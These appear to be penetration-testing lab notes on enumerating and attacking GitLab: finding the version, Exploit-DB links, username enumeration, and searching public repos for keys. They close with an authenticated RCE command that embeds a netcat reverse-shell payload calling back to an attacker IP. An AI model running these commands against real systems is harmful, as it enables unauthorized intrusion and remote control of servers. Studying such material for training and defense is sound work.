# Discovery and Enumeration 
* Most companies only allow an internal email to be registered. 
* Get the version number is by navigating to `/help`
### Serious Exploits
#### Gitlab
* [12.9.0](https://www.exploit-db.com/exploits/48431)
* [11.4.7](https://www.exploit-db.com/exploits/49257)
#### Gitlab Community
* [13.10.3](https://www.exploit-db.com/exploits/49821)
* [13.9.3](https://www.exploit-db.com/exploits/49944)
* [13.10.2](https://www.exploit-db.com/exploits/49951)
## Enumeration
	* Try browsing to ` `
	* See if there are any public repos
		* May find SSH keys, API keys etc
	* Explore linked paged in the top right.
* See if we can register an account 
* Use the form to enumerate valid users and emails.
* If you can register, navigate back to `/explore`
## Attacking GitLab
### Username Enumeration 
* Username Enumeration script:
	* https://www.exploit-db.com/exploits/49821
	* https://github.com/dpgg101/GitLabUserEnum
* Git lab sets to 10 attempts before lockout by default
```shell
./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt
```
### Authenticated Remote Code Execution 
* Version 13.10.2 suffered from an authenticated remote code execution vulnerability. 
* [Exploit](https://www.exploit-db.com/exploits/49951)
```shell
 python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
```